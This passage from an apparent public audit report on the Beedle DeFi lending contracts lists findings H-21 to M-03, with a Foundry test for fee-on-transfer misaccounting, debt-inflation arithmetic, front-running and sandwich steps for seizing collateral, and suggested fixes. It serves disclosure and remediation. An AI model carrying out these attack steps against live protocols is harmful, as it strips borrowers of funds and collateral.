        );
    }
}
```

### `ERC20FeeTest.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./BaseLender.sol";

contract ERC20WithFee is ERC20 {
    uint256 public constant FEE_BPS = 50; // 0.5%

    uint256 public feeAccumulated;

    function name() public pure override returns (string memory) {
        return "Test ERC20WithFee";
    }

    function symbol() public pure override returns (string memory) {
        return "ERC20WithFee";
    }

    function mint(address _to, uint256 _amount) public {
        _mint(_to, _amount);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        uint256 protocolFee = amount * FEE_BPS / 10_000;
        feeAccumulated += protocolFee;
        return super.transfer(to, amount - protocolFee);
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        uint256 protocolFee = amount * FEE_BPS / 10_000;
        feeAccumulated += protocolFee;
        return super.transferFrom(from, to, amount - protocolFee);
    }
}

contract ERC20FeeTest is BaseLender {

    function setUp() override public {
        super.setUp();
    }

    function testERC20WithFee() public {
        ERC20WithFee loanTokenWithFee = new ERC20WithFee();
        uint256 loanTokenForPool = 10 ether;

        vm.startPrank(lender1);
        loanTokenWithFee.mint(address(lender1), loanTokenForPool);
        loanTokenWithFee.approve(address(lender), loanTokenForPool);
        vm.stopPrank();

        // create the lending pool for Lender1
        vm.prank(lender1);
        bytes32 poolId1 = lender.setPool(Pool({
            lender: lender1,
            loanToken: address(loanTokenWithFee),
            collateralToken: address(collateralToken),
            minLoanSize: 10 ether,
            poolBalance: loanTokenForPool,
            maxLoanRatio: 2 ether,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        }));

        // Assert that the lender contract has only received (loanTokenForPool - ERC20_FEE) but that has accounted the whole loanTokenForPool in the poolBalance
        assertLt(loanTokenWithFee.balanceOf(address(lender)), loanTokenForPool);
        assertEq(loanTokenWithFee.balanceOf(address(lender)), loanTokenForPool - (loanTokenForPool * loanTokenWithFee.FEE_BPS() / 10_000));
        assertEq(lender.getPoolInfo(poolId1).poolBalance, loanTokenForPool);

        
    }

}
```

## Recommendations

The protocol should choose one of the following options:

1) Have a list of whitelisted collateral and lending tokens that can be used
2) Correctly account the real amount that has been deposited to the `Lender` contract or from the `Lender` contract after the transfer has happened
## <a id='H-21'></a>H-21. Forcing a borrower to pay a huge debt via the giveLoan()

_Submitted by [ziyou3](https://profiles.cyfrin.io/u/undefined), [credence0x](https://profiles.cyfrin.io/u/undefined), [rvierdiiev](https://profiles.cyfrin.io/u/undefined), [Bobface](https://profiles.cyfrin.io/u/undefined), [0xJuda](https://profiles.cyfrin.io/u/undefined), [toshii](https://profiles.cyfrin.io/u/undefined), [ke1cam](https://profiles.cyfrin.io/u/undefined), [Juntao](https://profiles.cyfrin.io/u/undefined), [polaris_tow](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined), [0xscsamurai](https://profiles.cyfrin.io/u/undefined), [CircleLooper](https://profiles.cyfrin.io/u/undefined), [BanditSecurity](https://profiles.cyfrin.io/u/undefined), [8olidity](https://profiles.cyfrin.io/u/undefined), [Niki](https://profiles.cyfrin.io/u/undefined), [ubermensch](https://profiles.cyfrin.io/u/undefined), [serialcoder](https://profiles.cyfrin.io/u/undefined), [VaRuN](https://profiles.cyfrin.io/u/undefined), [trachev](https://profiles.cyfrin.io/u/undefined), [JMTT](https://profiles.cyfrin.io/u/undefined), [Crunch](https://profiles.cyfrin.io/u/undefined), [KrisApostolov](https://profiles.cyfrin.io/u/undefined). Selected submission by: [serialcoder](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L381

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L420

## Summary

The `Lender::giveLoan()` can be used by a rogue lender to force a borrower to pay a huge debt to repay their loan. Otherwise, their loan's collateral tokens will be seized.

## Vulnerability Details

Even if *allowing a lender to give a loan to another pool* (via the `giveLoan()`) is a feature, a rogue lender can execute the `giveLoan()` to force the loan's principal debt to compound with the loan's interests (`lenderInterest` + `protocolInterest`).

After executing the `giveLoan()`, the loan's debt will become bigger. Specifically, the [old debt will be compounded with the loan's interests](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L381) to become the [new bigger debt](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L420).

```solidity
    function giveLoan(
        uint256[] calldata loanIds,
        bytes32[] calldata poolIds
    ) external {
        for (uint256 i = 0; i < loanIds.length; i++) {
            ...

            // calculate the interest
            (
                uint256 lenderInterest,
                uint256 protocolInterest
            ) = _calculateInterest(loan);
@>          uint256 totalDebt = loan.debt + lenderInterest + protocolInterest;

            ...

            // update the loan with the new info
            loans[loanId].lender = pool.lender;
            loans[loanId].interestRate = pool.interestRate;
            loans[loanId].startTimestamp = block.timestamp;
            loans[loanId].auctionStartTimestamp = type(uint256).max;
@>          loans[loanId].debt = totalDebt;

            ...
        }
    }
```

- `Old debt will be compounded with the loan's interests`: https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L381

- `New bigger debt`: https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L420

### Proof of Concept

Let's do a simple math for demonstration. Assume that:
- `Debt`: $5
- `InterestRate`: 0.1 (10%) per second
- `BorrowingLength`: 10 seconds

Scenario 1: a borrower borrows the debt for 10 seconds and repays their loan

```solidity
// Just a simple math for PoC

// InterestToPay already includes both the lenderFee and protocolFee
InterestToPay = InterestRate * Debt * BorrowingLength
		      = 0.1 * $5 * 10
		      = $5

TotalDebt = Debt + InterestToPay
		  = $5 + $5
		  = $10
```

Scenario 2: a borrower borrows the debt for 10 seconds and repays their loan but at the 5th second, a lender executes the `giveLoan()`

```solidity
// Just a simple math for PoC

// InterestFirst5Sec already includes both the lenderFee and protocolFee
InterestFirst5Sec = InterestRate * Debt * BorrowingLength
		          = 0.1 * $5 * 5
		          = $2.5

TotalDebtAfter5Sec = Debt + InterestFirst5Sec
		           = $5 + $2.5
		           = $7.5 (this will become a new debt)

// InterestSecond5Sec already includes both the lenderFee and protocolFee
InterestSecond5Sec = InterestRate * NewDebt * BorrowingLength
		           = 0.1 * $7.5 * 5
		           = $3.75

TotalDebtAfter10Sec = NewDebt + InterestSecond5Sec
		            = $7.5 + $3.75
		            = $11.25
```

As you can see, a borrower must pay more debt to repay their loan. Imagine the case that an attacker (rogue lender) executes the `giveLoan()` multiple times; the borrower will be forced to pay a huge debt to repay their loan. Otherwise, their loan's collateral tokens will be seized.

## Impact

An attacker (rogue lender) can execute the `giveLoan()` multiple times through the same pool or other Sybil pools *(the pools generated by different lender addresses, but the same attacker controls them)*. 

As a result, a borrower will be forced to pay a huge debt to repay their loan. Otherwise, their loan's collateral tokens will be seized. Hence, this issue is considered high severity.

## Tools Used

Manual Review

## Recommendations

*Since an attacker (rogue lender) can exploit the issue through their controllable Sybil pools, we cannot address the issue by disallowing a lender to execute the `giveLoan()` on the same pool.*

Thus, a borrower should have choices for mitigating the issue when borrowing a loan. 

Two example choices:
1. A borrower can ***disallow*** giving their loan to another pool via the `giveLoan()`. In this case, a lender could execute the `startAuction()` only.
2. A borrower can ***allow*** giving their loan to another pool via the `giveLoan()`. In this case, a borrower should be able to limit the maximum times the `giveLoan()` can execute on their loan.
## <a id='H-22'></a>H-22. Hardcoded Router Address May Cause Token Lockup in Non-Standard Networks

_Submitted by [ptsanev](https://profiles.cyfrin.io/u/undefined), [rvierdiiev](https://profiles.cyfrin.io/u/undefined), [0xAsen](https://profiles.cyfrin.io/u/undefined), [nisedo](https://profiles.cyfrin.io/u/undefined), [Shogoki](https://profiles.cyfrin.io/u/undefined), [auditism](https://profiles.cyfrin.io/u/undefined), [ke1cam](https://profiles.cyfrin.io/u/undefined), [pep7siup](https://profiles.cyfrin.io/u/undefined), [sobieski](https://profiles.cyfrin.io/u/undefined), [0xyPhilic](https://profiles.cyfrin.io/u/undefined), [B353N](https://profiles.cyfrin.io/u/undefined), [tsvetanovv](https://profiles.cyfrin.io/u/undefined), [ni8mare](https://profiles.cyfrin.io/u/undefined), [kose](https://profiles.cyfrin.io/u/undefined), [dethera](https://profiles.cyfrin.io/u/undefined), [UrosZigic](https://profiles.cyfrin.io/u/undefined), [Deivitto](https://profiles.cyfrin.io/u/undefined). Selected submission by: [B353N](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L16-L17

## Summary
This audit report provides an assessment of the contract containing the hardcoded router address for token swaps. The router address is set to "0xE592427A0AEce92De3Edee1F18E0157C05861564" and refers to a specific instance of ISwapRouter. The hardcoded router address can cause issues when deployed on networks where this address does not correspond to the appropriate Uniswap router. In such cases, tokens may become locked in the protocol indefinitely, preventing withdrawals and potentially leading to financial losses.
## Vulnerability Details
The contract contains the following line of code with the hardcoded router address:
```solidity
ISwapRouter public constant swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
```
The hardcoded address "0xE592427A0AEce92De3Edee1F18E0157C05861564" points to a specific instance of the Uniswap Router contract. In a situation where the contract is deployed on networks with a different Uniswap router address, token swaps may not function as intended. This can result in tokens becoming locked in the protocol, leaving users unable to withdraw their tokens except for WETH and TKN (protocol token).
## Impact
The presence of the hardcoded router address can lead to token lockup issues when the contract is deployed on networks with a non-standard Uniswap router. Tokens sent to the contract for swapping purposes may not be routed correctly, potentially resulting in funds being locked in the protocol forever. This can result in users losing access to their tokens and can have severe financial consequences for affected users and the protocol.
## Tools Used
VSCODE, Manual Review
## Recommendations
To ensure compatibility and flexibility across different networks, it is recommended to implement a more dynamic approach for setting the router address. Instead of hardcoding the router address, the contract should allow the router address to be set during deployment or provide a mechanism for the contract owner to update the router address post-deployment.

Option 1: Constructor Argument
Allow the router address to be passed as an argument during contract deployment. This way, the contract can be deployed with the appropriate router address for each network.

```solidity
constructor(address _swapRouter) {
    require(_swapRouter != address(0), "Invalid router address");
    swapRouter = ISwapRouter(_swapRouter);
}
```

Option 2: Admin Function
Implement an administrative function that allows the contract owner to update the router address after deployment. Ensure that only the contract owner can access and execute this function to prevent unauthorized changes.

```solidity
address public swapRouter;

function setSwapRouter(address _newRouter) public onlyOwner {
    require(_newRouter != address(0), "Invalid router address");
    swapRouter = ISwapRouter(_newRouter);
}
```
By implementing one of these options, the contract will be able to adapt to different networks and use the appropriate router address for token swaps, avoiding potential token lockup issues.
## <a id='H-23'></a>H-23. Lender can Sandwich a borrower to seize his collateral

_Submitted by [GoSoul22](https://profiles.cyfrin.io/u/undefined), [1d9f10834c](https://profiles.cyfrin.io/u/undefined), [cosine](https://profiles.cyfrin.io/u/undefined), [qbs](https://profiles.cyfrin.io/u/undefined), [Bobface](https://profiles.cyfrin.io/u/undefined), [0xanjan143](https://profiles.cyfrin.io/u/undefined), [lealCodes](https://profiles.cyfrin.io/u/undefined), [pep7siup](https://profiles.cyfrin.io/u/undefined), [bernd](https://profiles.cyfrin.io/u/undefined), [CircleLooper](https://profiles.cyfrin.io/u/undefined), [sobieski](https://profiles.cyfrin.io/u/undefined), [0xDetermination](https://profiles.cyfrin.io/u/undefined), [Juntao](https://profiles.cyfrin.io/u/undefined), [0xAsen](https://profiles.cyfrin.io/u/undefined), [hash](https://profiles.cyfrin.io/u/undefined), [ubermensch](https://profiles.cyfrin.io/u/undefined), [Mlome](https://profiles.cyfrin.io/u/undefined), [JMTT](https://profiles.cyfrin.io/u/undefined), [Crunch](https://profiles.cyfrin.io/u/undefined), [ayeslick](https://profiles.cyfrin.io/u/undefined). Selected submission by: [hash](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L232-L287

## Summary
A malicious lender can sandwich a borrow making him eligible to seize the collateral in the first block after 1 second.

## Vulnerability Details
A loan auction can be seized after auctionLength seconds have passed since the start of the auction. Seizing the loan gives the lender the collateral amount which would usually be worth much more than the debt.  

A very small value of auctionLength like 1 would allow the lender to seize the loan. If the block time of the network is more than 1 second, he can start an auction by calling the startAuction function in a block and then call the seizeLoan function in the next block front-running any attempt to repay from the borrower. If the block time is less than 1second, he can stuff the blocks till 1 second passes to prevent the borrower from repaying although it is very unlikely that a borrower will be able to attempt to repay within 1second.  

But since the borrower has the ability to know the auctionLength before borrowing from a pool, he can avoid borrowing from such pools. But a malicious lender can perform the following attack to obtain the above result:  
1. Lender creates a pool with a reasonable auctionLength
1. A borrower attempts to borrow from the lender's pool
1. Lender sandwiches the borrowers transaction and sets the auctionLength of the pool to 1 by calling the setPool function before the borrowers transaction and starts the loan auction after the borrower has borrowed.
1. He calls the seizeLoan function after 1 second passes 

## Impact
The borrower will loose the collateral which will usually be worth much more than the debt.

## Tools Used
Manual review

## Recommendations
Allow the borrower to pass the expected state of the pool when attempting to borrow and perform validation.

```solidity

struct Borrow {
    /// @notice the pool ID to borrow from
    bytes32 poolId;
    /// @notice the amount to borrow
    uint256 debt;
    /// @notice the amount of collateral to put up
    uint256 collateral;
    /// @notice the expected auction length
    uint256 expectedAuctionLength;
}

function borrow(Borrow[] calldata borrows) public {
      
        for (uint256 i = 0; i < borrows.length; i++) {
            .......  

            bytes32 poolId = borrows[i].poolId;
            Pool memory pool = pools[poolId];  

            // validate the auctionLength
            if (pool.auctionLength != borrows[i].expectedAuctionLength) revert PoolConfig();  

            ........        
```
## <a id='H-24'></a>H-24. WETH staking rewards accumulated before the first staker deposits remain unutilized and stuck in the `Staking` contract

_Submitted by [credence0x](https://profiles.cyfrin.io/u/undefined), [bauchibred](https://profiles.cyfrin.io/u/undefined), [BanditSecurity](https://profiles.cyfrin.io/u/undefined), [toshii](https://profiles.cyfrin.io/u/undefined), [abarbatei](https://profiles.cyfrin.io/u/undefined), [jonatascm](https://profiles.cyfrin.io/u/undefined), [bernd](https://profiles.cyfrin.io/u/undefined), [hasanza](https://profiles.cyfrin.io/u/undefined), [ubermensch](https://profiles.cyfrin.io/u/undefined), [dipp](https://profiles.cyfrin.io/u/undefined), [johan](https://profiles.cyfrin.io/u/undefined). Selected submission by: [bernd](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L62

## Summary

Fees accrued from the `Lending` contract and sent to the `Staking` contract to be used as staking rewards are not claimable if no staker has deposited tokens yet.

## Vulnerability Details

The `Lending` contract continuously accrues fees and sends fees via the `Fees` contract to the `Staking` contract, WETH rewards potentially accumulate in the `Staking` contract even before stakers deposit tokens (i.e., `totalSupply == 0`).

As soon as the first user stakes `TKN` tokens with the `deposit` function, the internal call of the `updateFor` function leads to the `index` being updated (reflecting the previously topped-up WETH tokens). This newly updated and non-zero `index` is then used to [initialize the user's `supplyIndex` in line 92](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L92). Similarly for subsequent stakers.

Consequently, the claimable rewards are zero for those stakers, and the initial WETH token rewards remain unutilized and stuck in the `Staking` contract.

[Staking.sol#L62](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L62)

```solidity
61: function update() public {
62:  @> uint256 totalSupply = TKN.balanceOf(address(this));
63:     if (totalSupply > 0) {
64:         uint256 _balance = WETH.balanceOf(address(this));
65:         if (_balance > balance) {
66:             uint256 _diff = _balance - balance;
67:             if (_diff > 0) {
68:                 uint256 _ratio = _diff * 1e18 / totalSupply;
69:                 if (_ratio > 0) {
70:                     index = index + _ratio;
71:                     balance = _balance;
72:                 }
73:             }
74:         }
75:     }
76: }
```

## Impact

Topped-up WETH rewards can not be claimed as rewards and remain unutilized and stuck in the `Staking` contract.

## Tools Used

Manual Review

## Recommendations

Consider accounting for the total staked amount of `TKN` tokens in a separate storage variable after the `TKN` token transfer in the `deposit` function instead of retrieving the current balance of `TKN` tokens via the `balanceOf` function in line 62. This ensures that only properly staked `TKN` tokens are accounted for in the `index` calculation.

## <a id='H-25'></a>H-25. WETH token balance is incorrectly updated when claiming staking rewards resulting in stuck WETH rewards

_Submitted by [bernd](https://profiles.cyfrin.io/u/undefined), [KrisApostolov](https://profiles.cyfrin.io/u/undefined). Selected submission by: [bernd](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L57

## Summary

The `Staking` contract incorrectly updates the WETH token balance when claiming staking rewards, preventing newly topped-up WETH rewards from being reflected in the `index` storage variable.

## Vulnerability Details

Claiming staking rewards with the `claim` function in the `Staking` contract updates the contract's storage variable `balance` to the current WETH balance in line 47. This update intends to reflect the WETH transfer out of the contract to the staker, i.e., the sent rewards.

However, if the total supply (`totalSupply`, i.e., staked `TKN` tokens) is zero, the reward `index` is not updated due to the `if` in line 63, while the WETH `balance` is updated in line 57. Please note that `totalSupply` can be zero right after the staking contract is deployed and before stakers deposit tokens. It can also be zero at a later time in case all stakers unstaked their deposits. Moreover, the `claim` function can be called by anyone, even if the caller is not a staker and has no claimable rewards.

Storing the current WETH token balance in `balance` while there have been new WETH tokens sent to the contract as rewards (by the `Fees` contract), those rewards are not reflected in the `index` as the balance check in line 65 would not detect the WETH balance change.

As the `Lending` contract continuously accrues fees and sends fees via the `Fees` contract to the `Staking` contract, WETH rewards can potentially accumulate in the `Staking` contract before stakers deposit tokens (i.e., `totalSupply == 0`). Thus the chosen High severity as the likelihood of stuck WETH rewards is high.

[Staking.sol#L57](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L57)

```solidity
53: function claim() external {
54:     updateFor(msg.sender);
55:     WETH.transfer(msg.sender, claimable[msg.sender]);
56:     claimable[msg.sender] = 0;
57:  @> balance = WETH.balanceOf(address(this)); // @audit-info `balance` is cached here
58: }
```

[Staking.sol#L65](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L65)

```solidity
61: function update() public {
62:     uint256 totalSupply = TKN.balanceOf(address(this));
63:     if (totalSupply > 0) {
64:         uint256 _balance = WETH.balanceOf(address(this));
65:  @>     if (_balance > balance) { // @audit-info `balance` got cached in a previous `claim` call and thus `_balance` and `balance` are equal
66:             uint256 _diff = _balance - balance;
67:             if (_diff > 0) {
68:                 uint256 _ratio = _diff * 1e18 / totalSupply;
69:                 if (_ratio > 0) {
70:                     index = index + _ratio;
71:                     balance = _balance;
72:                 }
73:             }
74:         }
75:     }
76: }
```

## Impact

Topped-up WETH rewards can not be claimed as rewards and remain unutilized and stuck in the `Staking` contract.

## Tools Used

Manual Review

## Recommendations

Consider subtracting the claimed rewards amount from `balance` in line 57 instead of storing the current WETH balance.

Additionally, consider reverting if no rewards are claimable, i.e., `claimable[msg.sender] == 0` by the caller (`msg.sender`) in the `claim` function.

## <a id='H-26'></a>H-26. The `borrow` and `refinance` functions can be front-run by the pool lender leading to collateral being seized in the next block

_Submitted by [0xbepresent](https://profiles.cyfrin.io/u/undefined), [pep7siup](https://profiles.cyfrin.io/u/undefined), [bernd](https://profiles.cyfrin.io/u/undefined). Selected submission by: [bernd](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L259

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L694

## Summary

The pool's `auctionLength` is assigned to the loan without the borrower having the possibility to define a minimum value. This allows the pool lender to front-run the borrower by calling the `borrow` or `refinance` function and setting a very short `auctionLength` value. Resulting in the collateral being seized in the next block.

## Vulnerability Details

If a user/borrower calls the `borrow` or `refinance` functions, the pool lender can front-run and change the pool's `auctionLength` to an unfavorable (for the borrower) and very small value (e.g., `1`) by using the `setPool` function. Subsequently, the lender of the pool can start the auction for the loan. Due to the short `auctionLength`, the auction will end in the next block. This allows the lender (or basically anyone) to seize the collateral in the next block.

- The `borrow` function assigns the `pool.auctionLength` to the loan in [L259](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L259)
- The `refinance` function updates the loan's auction length to the `pool.auctionLength` in [L694](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L694)

## Impact

The pool lender can seize the loan's collateral almost immediately (specifically, in the next block), causing a loss to the borrower.

## Tools Used

Manual Review

## Recommendations

Consider allowing the borrower to define a minimum auction length when borrowing or refinancing and validate if the pool fulfills this criterion. Additionally, consider adding a reasonable minimum value for the auction length (e.g., 1 hour or 1 day) to allow the borrower to act appropriately.


# Medium Risk Findings

## <a id='M-01'></a>M-01. Precision loss allows users to giveLoans to pools with less collateral then required

_Submitted by [degensec](https://profiles.cyfrin.io/u/undefined), [33audits](https://profiles.cyfrin.io/u/undefined), [Tatakae](https://codehawks.cyfrin.io/team/clkpe7ipx0001kz08k8k1pp3v), [serialcoder](https://profiles.cyfrin.io/u/undefined). Selected submission by: [33audits](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L385

## Summary

The `_calculateInterest` function is vulnerable to precision loss. Due to dividing twice the function will return zero for both interest and `protocolInterest`. This could lead to a lender giving their loan to another pool that doesn't have the balance to cover it. Leading to a loss for them and a gain for the future pools as they will have debts greater than their balance.

## Vulnerability Details

`giveLoan()` calls `_calculateInterest()` which then returns the amount of interest the protocol fee and adds that to the loan (debt) in order to calculate the `totalDebt`.However, we already determined that these values are vulnerable to precision loss leading them to return 0 in some cases or be smaller than expected. That would lead to an inaccurate `totalDebt` and `loanRatio` allowing us to give a loan to a pool that has a higher loan ratio than our current pool which is not the expected behavior of the protocol.

## Impact

The effect of this is the `loanRatio` value will be lower than expected.

```solidity
            // assume the following
            // totalDebt  = 40 and loan.collateral = 10
            // expected calculation  30 / 10 = 3
            // actual due to precision loss 20 / 10 = 2
            // maxLoanRatio = 2
            uint256 loanRatio = (totalDebt * 10 ** 18) / loan.collateral;
            // we would expect the next line to revert but
            // this would pass allowing us to create a loan with less collateral than needed for this pool
            if (loanRatio > pool.maxLoanRatio) revert RatioTooHigh();
```

This would allow a user to move their loan to a pool in which their loanRatio is greater than the maxloanRatio for that pool. Allowing them to move and create loans to pools with less collateral than the pool requires.

## Recommended Steps

Verifying that neither the interest rate nor the fees are zero can help prevent precision loss and trigger a reversal if necessary. Additionally, establishing a minimum loan size could ensure that the left side of the equation consistently exceeds the right side.

```
 interest = (l.interestRate * l.debt * timeElapsed) / 10000 / 365 days;

        fees = (lenderFee * interest) / 10000;
        if(interest == 0 || fees == 0) revert PrecisionLoss();
        interest -= fees;

```

Another solution is creating a formula that always rounds up. This is in favor of the lender and the protocol as well. Something like this would suffice.

```
    /**
     * @param a numerator
     * @param b denominator
     * @dev Division, rounded up
     */
    function roundUpDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        return (a - 1) / b + 1;
    }
```
## <a id='M-02'></a>M-02. The `borrow` and `refinance` functions can be front-run by the pool lender to set high interest rates

_Submitted by [HChang26](https://profiles.cyfrin.io/u/undefined), [LaScaloneta](https://codehawks.cyfrin.io/team/clkgxjy6h0025lc080s97ux79), [GoSoul22](https://profiles.cyfrin.io/u/undefined), [kutu](https://profiles.cyfrin.io/u/undefined), [1d9f10834c](https://profiles.cyfrin.io/u/undefined), [degensec](https://profiles.cyfrin.io/u/undefined), [0xbepresent](https://profiles.cyfrin.io/u/undefined), [cosine](https://profiles.cyfrin.io/u/undefined), [0xumarkhatab](https://profiles.cyfrin.io/u/undefined), [auditism](https://profiles.cyfrin.io/u/undefined), [leasowillow](https://profiles.cyfrin.io/u/undefined), [lalanda](https://profiles.cyfrin.io/u/undefined), [qbs](https://profiles.cyfrin.io/u/undefined), [ptsanev](https://profiles.cyfrin.io/u/undefined), [BanditSecurity](https://profiles.cyfrin.io/u/undefined), [rafaelnicolau](https://profiles.cyfrin.io/u/undefined), [Bobface](https://profiles.cyfrin.io/u/undefined), [RugpullDetector](https://profiles.cyfrin.io/u/undefined), [0xAsen](https://profiles.cyfrin.io/u/undefined), [0xdeth](https://profiles.cyfrin.io/u/undefined), [toshii](https://profiles.cyfrin.io/u/undefined), [0xanjan143](https://profiles.cyfrin.io/u/undefined), [peanuts](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [lealCodes](https://profiles.cyfrin.io/u/undefined), [Juntao](https://profiles.cyfrin.io/u/undefined), [0xepley](https://codehawks.cyfrin.io/team/clkjtgvih0001jt088aqegxjj), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined), [0xrststn](https://profiles.cyfrin.io/u/undefined), [pep7siup](https://profiles.cyfrin.io/u/undefined), [bernd](https://profiles.cyfrin.io/u/undefined), [pengun](https://profiles.cyfrin.io/u/undefined), [CircleLooper](https://profiles.cyfrin.io/u/undefined), [iurii2002](https://profiles.cyfrin.io/u/undefined), [Bauer](https://profiles.cyfrin.io/u/undefined), [Tatakae](https://codehawks.cyfrin.io/team/clkpe7ipx0001kz08k8k1pp3v), [sobieski](https://profiles.cyfrin.io/u/undefined), [0xDetermination](https://profiles.cyfrin.io/u/undefined), [Madalad](https://profiles.cyfrin.io/u/undefined), [0xswahili](https://profiles.cyfrin.io/u/undefined), [tsvetanovv](https://profiles.cyfrin.io/u/undefined), [0xDanielH](https://profiles.cyfrin.io/u/undefined), [0xanmol](https://profiles.cyfrin.io/u/undefined), [aak](https://profiles.cyfrin.io/u/undefined), [0xl00k](https://profiles.cyfrin.io/u/undefined), [0xsilvermist](https://profiles.cyfrin.io/u/undefined), [ubermensch](https://profiles.cyfrin.io/u/undefined), [smbv1923](https://profiles.cyfrin.io/u/undefined), [ni8mare](https://profiles.cyfrin.io/u/undefined), [gkrastenov](https://profiles.cyfrin.io/u/undefined), [honeymewn](https://profiles.cyfrin.io/u/undefined), [HALITUS](https://profiles.cyfrin.io/u/undefined), [JMTT](https://profiles.cyfrin.io/u/undefined), [hlx](https://profiles.cyfrin.io/u/undefined), [Crunch](https://profiles.cyfrin.io/u/undefined), [ayeslick](https://profiles.cyfrin.io/u/undefined). Selected submission by: [bernd](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L256

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L688

## Summary

The pool's `interestRate` is assigned to the loan without the borrower having the possibility to define a maximum value. This allows the pool lender to front-run the borrower by calling the `borrow` or `refinance` function and setting the maximum possible `interestRate` value, i.e., `MAX_INTEREST_RATE`. This results in a very high interest payment for the borrower.

## Vulnerability Details

If a user/borrower calls the `borrow` or `refinance` functions, the pool lender can front-run and change the pool's `interestRate` to an unfavorable (for the borrower) and very high value (e.g., `MAX_INTEREST_RATE`) by using the `setPool` function. This results in a very high interest payment for the borrower, calculated in the [`_calculateInterest`](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L720) function.

- The `borrow` function assigns the `pool.interestRate` to the loan in [L256](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L256)
- The `refinance` function updates the loan's auction length to the `pool.interestRate` in [L688](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L688)

## Impact

Unnecessary and unexpected high interest rate for the borrower.

## Tools Used

Manual Review

## Recommendations

Consider allowing the borrower to define a maximum interest rate when borrowing or refinancing and validate if the pool fulfills this criterion.

## <a id='M-03'></a>M-03. If a borrower or lender got blacklisted by asset contract, their collateral or loan funds can be permanently frozen with the pool 

_Submitted by [sonny2k](https://profiles.cyfrin.io/u/undefined), [0xepley](https://codehawks.cyfrin.io/team/clkjtgvih0001jt088aqegxjj). Selected submission by: [sonny2k](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/sherlock-audit/2023-01-ajna-judging/issues/75

## Summary
It's impossible for borrower or lender to transfer their otherwise withdraw-able funds to another address. If for some reason borrower or kicker got blacklisted by collateral or loan token contract (correspondingly), these funds will be permanently frozen as now there is no mechanics to move them to another address or specify the recipient for the transfer.

## Vulnerability Details
If during the duration of a loan the borrower or lender got blacklisted by `collateral asset` contract, let's say it is USDC, there is no way to retrieve the collateral. These collateral funds will be permanently locked at the Pool contract balance.

This happens in [repay function](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L329) (which affects the borrower) and [seizeLoan function](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L565) (which affects the lender). There is no option to specify the address receiving the collateral asset.

